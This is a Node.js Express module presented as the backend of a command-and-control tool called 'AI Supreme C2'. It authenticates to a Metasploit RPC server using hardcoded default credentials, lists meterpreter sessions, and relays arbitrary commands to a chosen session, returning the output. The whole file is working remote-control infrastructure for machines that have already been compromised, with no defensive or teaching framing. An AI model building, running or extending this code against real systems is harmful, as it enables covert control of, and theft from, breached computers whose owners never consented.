/**
 * AI Supreme C2 Backend - Metasploit Framework Bridge
 * Handles session interaction via Metasploit RPC (msfrpcd).
 */
const express = require('express');
const axios = require('axios');
const msgpack = require('msgpack-lite');
const router = express.Router();

const MSF_RPC_URL = process.env.MSF_RPC_URL || 'http://127.0.0.1:55553/api';
const MSF_USER = process.env.MSF_USER || 'msf';
const MSF_PASS = process.env.MSF_PASS || 'msf';

let msfToken = null;

async function getMsfToken() {
    if (msfToken) return msfToken;
    try {
        const payload = msgpack.encode(["auth.login", MSF_USER, MSF_PASS]);
        const res = await axios.post(MSF_RPC_URL, payload, {
            headers: { 'Content-Type': 'binary/message-pack' },
            responseType: 'arraybuffer'
        });
        const decoded = msgpack.decode(Buffer.from(res.data));
        if (decoded.result === "success") {
            msfToken = decoded.token;
            console.log("[MSF-RPC] Authenticated successfully.");
            return msfToken;
        }
    } catch (err) {
        
    }
    return null;
}

// GET /api/msf/sessions
router.get('/sessions', async (req, res) => {
    const token = await getMsfToken();
    if (!token) {
        // Fallback to mock data for prototype if RPC is unavailable
        return res.json({ ok: true, sessions: { "1": { type: "meterpreter", info: "OFFLINE_MODE_MOCK", tunnel_peer: "127.0.0.1:4444" } } });
    }

    try {
        const payload = msgpack.encode(["session.list", token]);
        const response = await axios.post(MSF_RPC_URL, payload, {
            headers: { 'Content-Type': 'binary/message-pack' },
            responseType: 'arraybuffer'
        });
        const decoded = msgpack.decode(Buffer.from(response.data));
        res.json({ ok: true, sessions: decoded });
    } catch (err) {
        res.status(500).json({ ok: false, error: err.message });
    }
});

// POST /api/msf/session/:id/exec
router.post('/session/:id/exec', async (req, res) => {
    const { id } = req.params;
    const { command } = req.body;
    
    if (typeof command !== 'string' || !command.trim()) {
        return res.status(400).json({ ok: false, error: 'Invalid or missing command parameter.' });
    }

    const token = await getMsfToken();

    if (!token) {
        return res.json({ ok: true, result: { data: `[MOCK] Executed: ${command}` } });
    }

    try {
        const payload = msgpack.encode(["session.meterpreter_write", token, parseInt(id), command + "\n"]);
        await axios.post(MSF_RPC_URL, payload, {
            headers: { 'Content-Type': 'binary/message-pack' },
            responseType: 'arraybuffer'
        });

        // Small delay to allow output to populate
        await new Promise(r => setTimeout(r, 500));

        const readPayload = msgpack.encode(["session.meterpreter_read", token, parseInt(id)]);
        const readRes = await axios.post(MSF_RPC_URL, readPayload, {
            headers: { 'Content-Type': 'binary/message-pack' },
            responseType: 'arraybuffer'
        });
        const decoded = msgpack.decode(Buffer.from(readRes.data));
        res.json({ ok: true, result: { data: decoded.data } });
    } catch (err) {
        res.status(500).json({ ok: false, error: err.message });
    }
});

module.exports = router;
